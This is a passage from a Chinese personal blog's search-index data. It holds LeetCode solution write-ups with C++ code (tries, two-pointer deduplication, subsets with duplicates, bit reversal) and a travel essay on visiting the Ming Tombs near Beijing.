false; } }; 表现烂爆，就不放图了。一些题解中使用 map.count() 来判断桶是否存在，我使用 map.find() ，这样代码就冗长了一些。不过既然本题的核心算法实现了，其余细节了解便好。\n参考资料 [1] 力扣官方题解.存在重复元素 III[EB/OL].2021-04-17\nhttps://leetcode-cn.com/problems/contains-duplicate-iii/solution/cun-zai-zhong-fu-yuan-su-iii-by-leetcode-bbkt/\n[2] 宫水三叶.【宫水三叶】一题双解：「滑动窗口 \u0026amp; 二分」\u0026amp;「桶排序」解法[EB/OL].2021-04-17\nhttps://leetcode-cn.com/problems/contains-duplicate-iii/solution/gong-shui-san-xie-yi-ti-shuang-jie-hua-d-dlnv/\n[3] 黎猫大侠.C++利用桶分组，详细解释[EB/OL].2021-04-17\nhttps://leetcode-cn.com/problems/contains-duplicate-iii/solution/c-li-yong-tong-fen-zu-xiang-xi-jie-shi-b-ofj6/\n","date":"2021-04-18T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode220.-%E5%AD%98%E5%9C%A8%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0-iii/","title":"难题本 | LeetCode220. 存在重复元素 III"},{"content":"题目链接：https://leetcode-cn.com/problems/implement-trie-prefix-tree/\n定场句：人一能之，己百之；人十能之，己千之。果能此道矣，虽愚必明，虽柔必强。\n题目  Trie（发音类似 \u0026ldquo;try\u0026rdquo;）或者说 前缀树 是一种树形数据结构，用于高效地存储和检索字符串数据集中的键。这一数据结构有相当多的应用情景，例如自动补完和拼写检查。\n请你实现 Trie 类：\n  Trie() 初始化前缀树对象。\n  void insert(String word) 向前缀树中插入字符串 word 。\n  boolean search(String word) 如果字符串 word 在前缀树中，返回 true（即，在检索之前已经插入）；否则，返回 false 。\n  boolean startsWith(String prefix) 如果之前已经插入的字符串 word 的前缀之一为 prefix ，返回 true ；否则，返回 false 。\n  示例\n  输入：\n[\u0026ldquo;Trie\u0026rdquo;, \u0026ldquo;insert\u0026rdquo;, \u0026ldquo;search\u0026rdquo;, \u0026ldquo;search\u0026rdquo;, \u0026ldquo;startsWith\u0026rdquo;, \u0026ldquo;insert\u0026rdquo;, \u0026ldquo;search\u0026rdquo;]\n[[], [\u0026ldquo;apple\u0026rdquo;], [\u0026ldquo;apple\u0026rdquo;], [\u0026ldquo;app\u0026rdquo;], [\u0026ldquo;app\u0026rdquo;], [\u0026ldquo;app\u0026rdquo;], [\u0026ldquo;app\u0026rdquo;]]\n  输出：\n[null, null, true, false, true, null, true]\n  解释：\nTrie trie = new Trie();\ntrie.insert(\u0026ldquo;apple\u0026rdquo;);\ntrie.search(\u0026ldquo;apple\u0026rdquo;); // 返回 True\ntrie.search(\u0026ldquo;app\u0026rdquo;); // 返回 False\ntrie.startsWith(\u0026ldquo;app\u0026rdquo;); // 返回 True\ntrie.insert(\u0026ldquo;app\u0026rdquo;);\ntrie.search(\u0026ldquo;app\u0026rdquo;); // 返回 True\n  数据范围：\n1 \u0026lt;= word.length, prefix.length \u0026lt;= 2000\nword 和 prefix 仅由小写英文字母组成\ninsert、search 和 startsWith 调用次数 总计 不超过 30000 次\n   分析 是一个全新的知识点呢 (#^.^#)\n前缀树 Trie 是一种高效的用于信息检索（information retrieval）的数据结构，可以将搜索复杂度降到最低（关键字长度）。如果我们要在一堆字符串中寻找一个子串，常见的使用 二分搜索树 的思路时间复杂度为 O(M * log N) ，其中 M 是最长子串的长度，N 是现有的字符串个数。而使用前缀树，时间复杂度可以降为 O(M) 。\n原理 —— 插入 前缀树是一颗 多叉树 ，它的每一个节点可以分出若干个子节点，每一条边表示一个字符。你可以发现，从根节点开始向下走去，每走过一条边我们就得到了一个字符，遍历到一个 终止节点 时，我们就得到了一个 单词（字符串） 。\n比如，单词 dog 就能组成这么一颗前缀树：\n\rTrie “dog”\r\n从根节点向下遍历，到了节点 3 ，它应该被标记为 终止节点 ，我们就得到了 dog 。\n现在我们希望插入一个单词 doge ，要怎么做呢？\n我们还是进行遍历，从根节点出发，依次获取 d 、 o 、 g ，来到了节点 3 ，只需要再插入一条边表示 e 就可以了！\n\rTrie “dog” \u0026amp; “doge”\r\n在上面的图中，我标出了 终止节点 ，当我们遍历到 3 或 4 时，我们知道它们表示的是一个切实存在的字符串；而当我们遍历到 2 或 1 时，我们知道 do 或者 d 不是一个切实存在的字符串，它们只是某个单词的前缀而已。\n从这个模拟中可以看到， doge 和 dog 使用的是同一些字母前缀，这就是 前缀树 的意思。\n我们再插入一个单词 do ，这时根据我们遍历的结果发现，到达节点 2 的路径就能表示这个单词！那么我们不用再申请一个新的节点，直接将 2 标记为 终止节点 即可。\n\rTrie “dog” \u0026amp; “doge” \u0026amp; “do”\r\n最后，插入一个 bye 吧，相信读者已经能够模拟出这个过程了！（也可以点开下面的动图看看答案）\n\rTrie.insert(“bye”)\r\n\rTrie “dog” \u0026amp; “doge” \u0026amp; “do” \u0026amp; “bye”\r\n原理 —— 查询 我们能够插入一个单词（字符串），当然也就需要能够查询某个单词。对于一个给出的字符串 s ，我们从 Trie 的根节点出发，沿着它的每一个字符向下遍历，如果能够到达一个 终止节点 ，那么这个字符串 s 就存在于我们的集合中，否则它就是不存在的。\n例如我们要查询单词 bye ，从根节点出发，沿着每个字符对应的路径依次来到了 5 、 6 、 7 ，最后我们发现节点 7 是个终止节点，太好了，这个单词就是存在的。\n而当我们要查询单词 by ，从根节点出发，依次来到 5 、 6 ,节点 6 不是终止节点，那么这个单词就不存在于我们的集合中。\n原理 —— 构造 现在，我们能够将一个单词插入 Trie 中，也能查询一个单词是否存在于 Trie 中了，最后的问题是，如何构造这颗前缀树呢？\n从上面的例子中，你应该想到，这颗前缀树应该是一颗 多叉树 ，正如一开始所说的那样，而且，它每一个节点所分出来的边必须能够表示我们的 字符集 ，也就是说，假如我们的字符集记做 Σ ，那么前缀树的每个节点就应该有 len(Σ) 数量的边。在这道题中（你可能已经忘了题目了~），每个节点分出来的边数量就是 26 ，表示 a ~ z 是也。\n方法一 如果我们对节点进行编号，就可以用一个 二维数组 来保存整个 Trie 了，我们声明一个 trie[NODE_NUM][26] ，第一个下标表示节点编号，第二个下标表示分出来的26条边，每个边表示一个字母。\n如何表示终止节点呢？很简单，再声明一个 mark[NODE_NUM] 即可，对于任意一个节点的编号 p ，当 mark[p] 为 1 的时候表示它是终止节点。\n根节点编号是 0 ，对于我们上面的例子来说，bye 这个单词对应的路径是这样的：\n trie[0][1] = 5 trie[5][24] = 6 trie[6][4] = 7  每一个字符 ch 对应的第二个下标就简单地用 ch - 'a'来表示就行了。\n方法二 第一种构造方法胜在简单，节点下标和延伸出的边含义很直观，但是所耗费的空间比较大，即使某条路径是不存在的（如单词 hello ），它所对应的空间还是存在于数组中（只不过都被写为了 0 来表示不存在）。\n如果我们用链表的思想 + 动态申请内存的办法，效果则大不相同。使用一个数据结构来表示节点，它含有一个长度为 26 的 指针数组 ，每一个单元表示对应的边，指向下一个节点。同时，这个结构顺便定义了一个成员变量来表示该节点是否为终止节点，这种办法就简洁多了。\nAC代码1 此代码对应构造方法1\nclass Trie { public: int tire[100000][26]; int mark[100000]; int k; /** Initialize your data structure here. */ Trie() { k = 1; memset(tire, 0, sizeof(tire)); memset(mark, 0, sizeof(mark)); } /** Inserts a word into the trie. */ void insert(string word) { int p = 0; int c = 0; for (auto ch : word) { c = ch - \u0026#39;a\u0026#39;; if (tire[p][c] != 0) { p = tire[p][c]; } else { tire[p][c] = k; // 编号从1开始  k++; p = tire[p][c]; } } mark[p] = 1; } /** Returns if the word is in the trie. */ bool search(string word) { int p = 0; int c = 0; for (auto ch : word) { c = ch - \u0026#39;a\u0026#39;; if (tire[p][c] != 0) { p = tire[p][c]; } else { return false; } } if (mark[p]) return true; else return false; } /** Returns if there is any word in the trie that starts with the given prefix. */ bool startsWith(string prefix) { int p = 0; int c = 0; for (auto ch : prefix) { c = ch - \u0026#39;a\u0026#39;; if (tire[p][c] != 0) { p = tire[p][c]; } else { return false; } } return true; } }; /** * Your Trie object will be instantiated and called as such: * Trie* obj = new Trie(); * obj-\u0026gt;insert(word); * bool param_2 = obj-\u0026gt;search(word); * bool param_3 = obj-\u0026gt;startsWith(prefix); */ AC代码2 此代码对应构造方法2\nclass Trie { public: typedef struct n { struct n* childen[26]; int mark; } Node, *PNode; PNode root; /** Initialize your data structure here. */ Trie() { root = new Node; for (int i = 0; i \u0026lt; 26; i++) { (*root).childen[i] = 0; } } /** Inserts a word into the trie. */ void insert(string word) { PNode p = root; int c = 0; for (auto ch : word) { c = ch - \u0026#39;a\u0026#39;; if ((*p).childen[c]) { p = (*p).childen[c]; } else { (*p).childen[c] = new Node; p = (*p).childen[c]; for (int i = 0; i \u0026lt; 26; i++) { (*p).childen[i] = 0; } p-\u0026gt;mark = 0; } } p-\u0026gt;mark = 1; } /** Returns if the word is in the trie. */ bool search(string word) { PNode p = root; int c = 0; for (auto ch : word) { c = ch - \u0026#39;a\u0026#39;; if ((*p).childen[c]) { p = (*p).childen[c]; } else { return false; } } if (p-\u0026gt;mark) return true; else return false; } /** Returns if there is any word in the trie that starts with the given prefix. */ bool startsWith(string prefix) { PNode p = root; int c = 0; for (auto ch : prefix) { c = ch - \u0026#39;a\u0026#39;; if ((*p).childen[c]) { p = (*p).childen[c]; } else { return false; } } return true; } }; /** * Your Trie object will be instantiated and called as such: * Trie* obj = new Trie(); * obj-\u0026gt;insert(word); * bool param_2 = obj-\u0026gt;search(word); * bool param_3 = obj-\u0026gt;startsWith(prefix); */ \rPerformance——方法2\r\n\rPerformance Compare\r\n参考资料 [1] 向前走别回头.字典树（前缀树）[EB/OL].2018-08-24\nhttps://blog.csdn.net/weixin_39778570/article/details/81990417\n[2] GeeksforGeeks.Trie | (Insert and Search)[EB/OL].2019-09-04\nhttps://www.geeksforgeeks.org/trie-insert-and-search/\n","date":"2021-04-14T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode208.-%E5%AE%9E%E7%8E%B0-trie-%E5%89%8D%E7%BC%80%E6%A0%91/","title":"难题本 | LeetCode208. 实现 Trie (前缀树)"},{"content":"题目链接：https://leetcode-cn.com/problems/remove-duplicates-from-sorted-array-ii/\n题目  给你一个有序数组 nums ，请你 原地 删除重复出现的元素，使每个元素 最多出现两次 ，返回删除后数组的新长度。\n不要使用额外的数组空间，你必须在 原地 修改输入数组 并在使用 O(1) 额外空间的条件下完成。\n示例1\n 输入： nums = [1,1,1,2,2,3] 输出： 5, nums = [1,1,2,2,3] 解释： 函数应返回新长度 length = 5, 并且原数组的前五个元素被修改为 1, 1, 2, 2, 3 。 不需要考虑数组中超出新长度后面的元素。  示例2\n 输入： nums = [0,0,1,1,1,1,2,3,3] 输出： 7, nums = [0,0,1,1,2,3,3]  数据范围\n 1 \u0026lt;= nums.length \u0026lt;= 3 * 104 -104 \u0026lt;= nums[i] \u0026lt;= 104 nums 已按升序排列   分析 更新博客主题第一篇~ 分析部分不用 \u0026gt; 包起来了 ヽ(￣▽￣)ﾉ\n 一道乍看简单，细想麻烦的题目，放在 错题本 这个分类里，主要是由于朴素的暴力做法是能通过的。当然，题解里面的想法更为强大，当然，并不是特别难想，但是细节是较多的，也是本次错得最多的地方。\n朴素做法 这是我最初的想法。根据题意，最终相同的数字最多只有 两个 ，那么我们使用一个指针向前移动，当它和它的 下一位 元素值相同时，它的 下下位 元素的数值就必须和它不同了。即，当我们向后看去，发现下一个元素与当前元素相同时，可以直接确定下下位元素的值；并且确定了之后，需要从确定的点开始，将后面的元素都向前移动。\n\r示意图1\r\n移动之后，还需要进行 pop_back() 的操作。\n这就跟从一个有序数组中删除数据一样，我们删除的是一段重复的数据，要将后面的东西向前移动，覆盖掉这一段。\n这种思路下，限制条件就很多了：\n Q：当前元素没有下一个元素怎么办 A：说明它到达了最后一个元素，循环结束 Q：寻找下一个元素的时候有哪些注意点 A：使用一个指针向后寻找下一个元素，当它不越界且与当前元素仍然相等的时候，继续向后移动；当这一个循环退出之后，说明几个问题：我们找到了下一个元素或者之后没有符合条件的元素，在这里还需要进行一次判断  不得不说，我最开始、最朴素的想法反而特别的复杂，根据上面的内容能写出如下的代码：\nAC代码1 class Solution { public: int removeDuplicates(vector\u0026lt;int\u0026gt;\u0026amp; nums) { vector\u0026lt;int\u0026gt;::iterator p_now; vector\u0026lt;int\u0026gt;::iterator p_next; vector\u0026lt;int\u0026gt;::iterator p_tmp; int res, num_now; for (p_now = nums.begin(); p_now \u0026lt; nums.end(); ) { if (p_now == nums.end() - 1) { p_now++; break; } if (*p_now == *(p_now + 1)) { num_now = *p_now; p_now += 2; p_next = p_now; // get next num different from now  while (p_next \u0026lt; nums.end() \u0026amp;\u0026amp; *p_next == num_now) { p_next++; } // next position is valid  if (p_next \u0026lt; nums.end() \u0026amp;\u0026amp; p_next != p_now) { p_tmp = p_now; int diff = p_next - p_now; while (p_next \u0026lt; nums.end()) { *p_tmp = *p_next; p_next++; p_tmp++; } while (diff-- \u0026gt; 0) { nums.pop_back(); } } // next position is invalid  else if (p_next == nums.end()) { break; } } else { p_now++; } } // cout \u0026lt;\u0026lt; *p_now \u0026lt;\u0026lt; endl;  res = p_now - nums.begin(); while (nums.size() \u0026gt; res) { nums.pop_back(); } return res; } }; 大几十行的代码，没什么好说的了 -_-||\n对于原地修改来说，我的 pop_back() 操作实际上显得多余，表现是很一般的：\n\rPerformance1\r\n双指针 对于上面的做法，向后看 的思想使得我对于循环边界条件的判断比较困难，因为我们总是要考虑当前元素的 下一位 、 下下位 ，很容易就产生越界的问题。\n如果 向前看 ，怎么做呢？\n双指针的思想是，使用 快慢指针 ，慢指针 slow 指向当前的位置，快指针 fast 指向当前位置 应该填充 的元素；向前看去，当 *slow == *(slow - 2) 时，继续移动 fast 而使 slow 保持不动，直到符合 *slow != *fast ，即改变当前元素的值使得它不再与之前的元素相同。\n千言万语不如一张GIF（请点开它）：\n\rTets\r\n注意当 slow 指向了第三个 2 的时候，*slow == *(slow - 2) ，则 slow 不再继续前移，只移动 fast ，且只当 *fast ！= *slow 的时候才会继续移动 slow 。在本例中，将 *slow 更新为 3 之后， fast 和 slow 都要继续移动，然而 fast 已经走完了整个数组，故循环结束了。\n由此写出AC代码2.\nAC代码2 class Solution { public: int removeDuplicates(vector\u0026lt;int\u0026gt;\u0026amp; nums) { vector\u0026lt;int\u0026gt;::iterator slow; vector\u0026lt;int\u0026gt;::iterator fast; slow = nums.begin(); for (fast = nums.begin(); fast \u0026lt; nums.end(); fast++) { *slow = *fast; if (slow \u0026lt; nums.begin() + 2) { slow++; continue; } if (*slow == *(slow - 2) \u0026amp;\u0026amp; *slow == *fast) { // do not add slow  // cout \u0026lt;\u0026lt; *slow \u0026lt;\u0026lt; \u0026#34; == \u0026#34; \u0026lt;\u0026lt; *fast \u0026lt;\u0026lt; endl;  // cout \u0026lt;\u0026lt; slow - nums.begin() \u0026lt;\u0026lt; endl;  continue; } slow++; } /* for (vector\u0026lt;int\u0026gt;::iterator tmp = nums.begin(); tmp != slow; tmp++) { cout \u0026lt;\u0026lt; *tmp \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } cout \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;Ret: \u0026#34; \u0026lt;\u0026lt; slow - nums.begin() \u0026lt;\u0026lt; endl; */ return slow - nums.begin(); } };  我将调试代码都留在了此处，这是因为AC代码中有一步细节需要注意：\nfor (fast = nums.begin(); fast \u0026lt; nums.end(); fast++) { *slow = *fast; // --- snip --- } fast 的每一步移动都要伴随着 slow 的更新，并不需要关注 slow 满足什么条件。仅当 slow 与它的上上位不同的时候才会继续移动，因此不必担心赋值出现什么问题。这一步可是我WA了三次才得到的惨痛教训！\n \rPerformance2\r\n参考资料 [1] 力扣官方题解.删除排序数组中的重复项 II[EB/OL].2021-04-05\nhttps://leetcode-cn.com/problems/remove-duplicates-from-sorted-array-ii/solution/shan-chu-pai-xu-shu-zu-zhong-de-zhong-fu-yec2/\n[2] 负雪明烛.【负雪明烛】动画题解，帮助理清思路[EB/OL].2021-04-06\nhttps://leetcode-cn.com/problems/remove-duplicates-from-sorted-array-ii/solution/fu-xue-ming-zhu-dong-hua-ti-jie-bang-zhu-yrx5/\n","date":"2021-04-06T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode80.-%E5%88%A0%E9%99%A4%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E9%87%8D%E5%A4%8D%E9%A1%B9-ii/","title":"错题本 | LeetCode80. 删除有序数组中的重复项 II"},{"content":"前奏 上周便计划着利用清明假期出门游玩，而一周劳累之后，游兴顿起，再难收拾。昨天到了约好的时间，舍友却没办法从床上起来，我无心再作拖延，独自一人踏上了去往明十三陵的路程。\n此前并未做详细的路线调研，只觉得既然昌平线上有十三陵站，总不会骗我才是。在十三陵站下车，走出站门赫然是一片荒芜闭塞的小地方。十三陵，到现在还是切切实实的郊区。我对北方农村一直以来的热情在此刻也被一并激发出来，便无视了地铁站口那许多的揽客司机，独自向着十三陵的方向走去。\n天气实在太好了。晴空万里无一物，吹面不寒杨柳风。北方的春天与南方大不相同，经历了无比残酷的严寒之后，这个世界开始倾其所有温柔来哺育万物。北方的农村也与南方大不相同，它给我的感觉是更为开阔、更为肃穆，杨柳的阴影在老屋的硬山顶上流动，破碎的石板路和宽阔的柏油路交替述说着这一片村落的兴衰。我的家乡——闽南的村落我是很喜欢的，大抵由于宗法的盛行，邻舍之间的布局更加的紧密，总是给人一种热闹而团结的氛围，但从气质而言，则稍逊于此处了。\n沿着涧头村的村道走着，走上了昌赤路，十三陵的地界已然在我的正前方了。一路走过，所遇到的骑行者不可胜数，颇觉首都的文体活动确实是非常发达，不禁羡慕起了生长于此地的人们，在他们最美好的年华里，每年都能在这么舒爽的春气中驰骋在平整的乡道上，探访那些历史悠久的地方。\n沿着昌赤路直行数十分钟，到达了大宫门附近。在路边的农家餐馆中随便应付，稍作歇息便开启了游览十三陵的进程。大宫门本是神道的入口，却由于景区的施工而暂时封闭。我只得重新回到马路，继续朝着神道的方向走去。\n神道 神道是帝王和百官前往祭祀的起点，他们总要在这么一条长而不单调的道路上行进着，酝酿出对先祖的无比真挚的敬意来。\n从入门开始便显出了庄重。倘若帝王也于清明来祭拜祖先，则我们看到的景象是一样的：迈过了门槛，走出深厚而低矮的门，便是天地开阔、杨柳轻舞、石像规整、地砖严密的神道。古人确乎是事死如生，先帝所喜闻乐见的瑞兽、诤臣，也都要化作了石像，在这条长长直直的神道上永久地陪伴着他们的魂灵。凡此一类表征性的东西，是否能使先帝安息倒是还不可知，能使后来的拜祭者产生出自足而凝重的情绪恐怕是一定的了。\n也许在几百年前的某个清明，某位帝王就这么静默地走在这条神道上，追思先帝的种种，也冥想着关于天下百姓的种种。\n亦也许在几百年前的某个清明，某位帝王带着他的妃嫔，脚步轻快地在这里前行，赶紧完成了祭祀，还有盛大的宴会在等着他呢。\n定陵 从神道出去，距离真正的陵寝还有很远的距离。我在昌赤路上继续行进了几百米，打开地图一看，恐怕几公里的路程用脚走下来，时间的花费是吃不消的了。在昌平胡庄站上了公交，在拥挤的道路上走走停停，总算是来到了定陵。\n定陵是万历皇帝的陵寝，一位几十年不上朝的皇帝，对于自己身后的住所倒是非常上心。宫殿的规制还是很严格的，从入门开始，过祾恩门、祾恩殿（均被焚毁），来到棂星门和明楼。明楼脚下的两个偏殿中正在展出定陵地宫出土的文物，我在展厅内融入了一个导游团，听导游讲解定陵的故事。\n建国初期，考古专家们本欲发掘长陵（永乐皇帝朱棣的陵寝），但帝陵规制巨大，长陵又是其中最大，专家中没有一人有过发掘此类陵寝的经验。经过探讨，最终决定发掘规制较小的定陵，为长陵的发掘积攒经验。在发掘初期，专家在一条探沟中找到了明楼侧面的地下隧道，沿着此隧道的走向挖掘第二条探沟；在第二道探沟处找到了一块指路石碑，根据石碑的记载深挖第三道探沟，找到了地宫的大门。进入地宫，其大门竟是从内部顶住的，专家吓了一跳，认为这说明了当时有活人殉葬——活人从内部将大门锁上之后，在地宫中自决。然而史料记载在万历之前很久就已经废除了活人殉葬的制度，故此内部的门封，应是用了某些物理的办法来实现。打开地宫，果真干干净净，没有尸骨。他们逐步向内发掘，见到了万历皇帝宝座、孝端皇后宝座和孝靖皇后宝座；后殿是三具棺椁，左偏殿是一块石台，当中一处长方形开口，是为金井，乃是整座左偏殿的风水穴眼。后殿的金井正在万历皇帝棺椁下方，故无法目睹；如此穴眼是地宫建筑的中心，是风水最为关键的地方，古人相信，这类穴眼能使得帝王死后的元气继续护佑子孙万世。\n我们是从左偏殿进入地宫的，先瞧了瞧金井，后进入正殿看了宝座，后见了三具棺椁，最后从第三道探沟中经过地宫大门而出。地宫有一千多平方米，加上先前的许多建筑，可算得是一项很大的工程了。帝王将棺椁置于金井之上，希望自己的龙气荫及子孙，永保江山，而不知自己的一座陵寝使得子民付出了多少，使得国家付出了多少。十三座气势磅礴的陵寝，是十三个朝代人民的血汗和牺牲；皇家的金井玄学，只是希望皇权永固，而非希望子民安乐。或不如说，从帝王的生前到身后，整个无比高级、无比精细的礼制体系，本就建立在人民的付出之上，基于压榨人民的江山永固的愿望，本身就无法实现，江山是不可避免地会丢掉的。\n很有趣的是，地宫中三座宝座的面前都摆着一个青花瓷缸，内部原本是盛满了灯油，点着长明灯的。那微弱的火焰自然无法在这地下27米的地方长明，历经几百年的黑暗，后人在这里扯上了电线，点亮了电灯，一切清晰如昼，地宫算是真正地明亮了起来。\n从地宫的正门上明楼，这是一座完全用石质材料的建筑，故而未受战火的侵蚀。紫禁城用木质，陵寝明楼用石质，似乎相比于振兴民族、不朽于史册，还是自己陵寝的不朽更为重要一些。\n在明楼见到了一块巨大的石碑，相当于是墓碑了，上书：大明神宗显皇帝之陵。在明楼上，视野极开阔，在此前所提到的绝好天气里，江山真是无比多娇。我想，帝王死后有灵，从地宫出来在这明楼上看看，现今的景象大抵是不会令其失望的。然而，亦是同样的视角，恐怕也能见到农民的起义、外寇的入侵、人民的自主、新中国的旧貌新颜。中国人在这样的历史发展中站了起来，而幻想着江山永固的帝王恐怕就不会那么高兴了。\n长陵 从定陵出来，还得再乘十来分钟的公交车才能到达长陵。相较于定陵，长陵的规制更为宏大。战火并未使此地受损，我由此得以见到祾恩门、祾恩殿的样子。\n大抵可以将祾恩门、祾恩殿看作是太和门、太和殿，是皇帝于另一个世界上朝的地方。经典的重檐庑殿顶，檐角九走兽，无一不在显示皇权的威严。祾恩殿中立着一座很高的朱棣坐像，殿内展出的是定陵出土的文物（仿品），也没有什么好讲。我在这里又融入了第二个导游团，始觉得游览时有一个好导游是能学到很多的。\n出祾恩殿，来到棂星门和明楼。定陵发掘之后效果并不非常理想，由于长陵规制更为宏大，国家禁止了对帝陵的发掘。故长陵没有地宫可以参观，我们上明楼，在导游的讲解下才觉察到此处的玄妙所在。\n从长陵明楼望去，正面远处是昌平凤山，左面是莽山，右面是虎峪，后面是玄武山；四象齐聚，风水之祥瑞可见一斑。长陵是十三陵中的祖陵，风水尤佳，除了四象之外，多处水流汇集于此，取传统的“流水聚财”之意。依据风水，坐西北朝东南才是最佳的卦位，长陵朝向偏离南北九度，紫禁城朝向偏离南北六度，皆出于此。\n与定陵类似，长陵也有一块石碑，上书：大明成祖文皇帝之陵。“成祖”是庙号，有功称为祖，有德称为宗，原本朱棣的庙号为高宗，后世一位皇帝（记不清了）认为朱元璋开创大明基业有功，而朱棣稳固大明基业有功，亦可称之为“祖”，于是，大明成为历史上同时具备“明高祖”和“明成祖”两位祖的王朝。\n当时改宗为祖，石碑并未重新建造，而是在原本的石碑之外套上一层木质外壳。在嘉靖年间，一道天雷击中此处，木石俱毁。皇帝本身也是一位无功无德的人，认为是上天发怒，怪罪于己；此时一位大臣说：此前改宗为祖，并未重修石碑，今日天雷毁之，乃是令我们重修石碑之意，皇帝大喜，遂重修石碑，就是现今的这一块。\n长陵的石碑立此也几百年了，我对于这座明楼的想法，与定陵无异。从长陵出来时，导游跟游客打趣说：长陵风水最佳，而后逐个逐个的陵寝风水就渐渐差了，故大明国势也逐渐衰微。我想这确实有趣，但恐怕无理，哪有祖宗陵墓不占据上佳风水，而将之留给后世的道理呢？且若如此，则长陵占个风水最差的地方，后面的陵寝去寻更好的风水，则国运日强，统治延绵；每朝都如此做，中国岂有如此多的风水上佳之地？最终恐怕还是上升到了极限，要渐渐落下的。\n实际上我来教帝王选风水罢，世上本无绝佳的风水，人民就是最好的风水。\n","date":"2021-04-04T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E6%B8%B8%E6%98%8E%E5%8D%81%E4%B8%89%E9%99%B5%E8%AE%B0/","title":"游明十三陵记"},{"content":"题目链接：https://leetcode-cn.com/problems/subsets-ii/\n题目 给你一个整数数组 nums ，其中可能包含重复元素，请你返回该数组所有可能的子集（幂集）。\n解集 不能 包含重复的子集。返回的解集中，子集可以按 任意顺序 排列。\n示例1\n  输入： nums = [1,2,2]\n  输出： [[],[1],[1,2],[1,2,2],[2],[2,2]]\n  示例2\n  输入： nums = [0]\n  输出： [[],[0]]\n  分析  三个月之前WA过的题，在每日一题里碰见了，而我还是思考了很久 :cry:\n 原始数组中可能包含重复元素，则对于重复元素的考虑就尤为重要，一般来说，重复元素对于子集的贡献也有重复。\n我们不妨考虑进行以下的模拟，对于一个 不包含重复元素 的集合 [1, 2, 3] ，如何求得它的所有子集呢？\n首先，答案中包含一个空集。\n首先取得第一个元素，将其与当前答案中的所有集合拼接，放入答案中；\n考虑第二个元素，将其与当前答案中的所有集合拼接，放入答案中；\n第三个元素同理。\n\r示意\r\n在这个环节中，由于答案是在不断地增长的，我们只需要用一个变量保存添加元素之前的答案集合大小即可。\n这种做法的正确性是 不会证明 理所当然的。\n实际上，根据这种做法我们可以AC掉 LeetCode78. 子集 。\n// LeetCode 78 class Solution { public: vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; subsets(vector\u0026lt;int\u0026gt;\u0026amp; nums) { vector\u0026lt;int\u0026gt; tmp; vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; res; res.push_back(tmp); // empty set  for (auto n : nums) { int sze = res.size(); for (int i = 0; i \u0026lt; sze; i++) { tmp = res[i]; tmp.push_back(n); res.push_back(tmp); } } return res; } };   那么问题在于，本题的原始数组是可以重复的。\n对于重复数据，首先可以进行一波排序，使得我们比较方便地进行判重。\n在上面的做法中，重复数据产生的答案会有相当一部分重复，我们考虑集合 [1, 2, 2] ：\n\r对集合[1,2,2]进行同样的操作\r\n可以看到，对于重复出现的 2 来说，它不需要再与 [] 和 [1] 进行合并。\n那么，重复数据在哪里能够产生贡献呢？\n答案就是 上一步新加入的子集 ！\n\r重复数据与上一步加入的子集合并\r\n由此，形势就变得比较明朗了。对于非重复的数据，与目前拥有的所有子集进行合并；对于重复的数据，只与上一步加入的子集进行合并。\n如何只获取上一步加入的子集呢？在上面给出的代码中，我们使用 sze 来记录答案集合中原本的大小。很巧的，上一步加入的子集在答案集合中的下标就从 sze 开始。\n于是，使用一个变量 start 来记录本轮需要合并的子集起点，当当前的数是重复的， start 就被设置为 sze ，然后更新新的 sze ，否则 start 直接设置为 0 。\n AC代码 class Solution { public: vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; subsetsWithDup(vector\u0026lt;int\u0026gt;\u0026amp; nums) { vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; res; vector\u0026lt;int\u0026gt; tmp; res.push_back(tmp); int start, sze; sort(nums.begin(), nums.end()); for (int idx = 0; idx \u0026lt; nums.size(); idx++) { if (idx \u0026gt; 0 \u0026amp;\u0026amp; nums[idx] == nums[idx - 1]) { start = sze; } else { start = 0; } sze = res.size(); for (int i = start; i \u0026lt; sze; i++) { tmp = res[i]; tmp.push_back(nums[idx]); res.push_back(tmp); } } return res; } }; \rPerformance\r\n小结 三个月前WA掉的题目在今天重新来到我的面前，经过一番思索之后能够独立地将其做出来了。人生点滴进步大抵皆见于此类细节之中。题解基本采用回溯的办法，在此没有花费精力予以研究。亦因此本文无所参考，便有，也是此三月中所见的某篇文章，回忆不清矣。\n","date":"2021-03-31T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode90.-%E5%AD%90%E9%9B%86-ii/","title":"难题本 | LeetCode90. 子集 II"},{"content":"题目链接：https://leetcode-cn.com/problems/reverse-bits/\n一道简单题，却能引出一个无比骚包的操作。此法前所未见，独自亦难想出，因此大抵也算是难的。\n题目  颠倒给定的 32 位无符号整数的二进制位。\n示例1\n  输入： 00000010100101000001111010011100\n  输出： 00111001011110000010100101000000\n  解释： 输入的二进制串 00000010100101000001111010011100 表示无符号整数 43261596， 因此返回 964176192，其二进制表示形式为 00111001011110000010100101000000。\n  示例2\n 输入： 11111111111111111111111111111101 输出： 10111111111111111111111111111111   分析  易得简单暴力的32次循环法，在此不表，详见AC代码1。唯有一点值得注意：先加最低位再将 res 移位的时候，只能移动 31 次，否则最高位将溢出。因此，AC代码1中只取31次循环，而将最后一位置于循环外。\n 对于一个首尾对换的操作，我们可以使用分治的思路。\n考虑对于最大的32位二进制，将前16位与后16位对换。\n考虑高低的16位，将每一部分中的高8位与低8位对换。\n如此进行······\n\r分治\r\n那么，我们如何做到这种形式的对换呢？\n不妨以8位二进制为例，对于一个八位二进制数 1011 0011 ，我们首先需要将其高低四位进行对换。示意如下：\n\rStep 1\r\n对于一个二进制数，我们可以很简单地使用如下办法取得它的高低四位：\nhighBits = 0x10110011 \u0026amp; 0x11110000 = 0x10110011 \u0026amp; 0xf0\nlowBits = 0x10110011 \u0026amp; 0x00001111 = 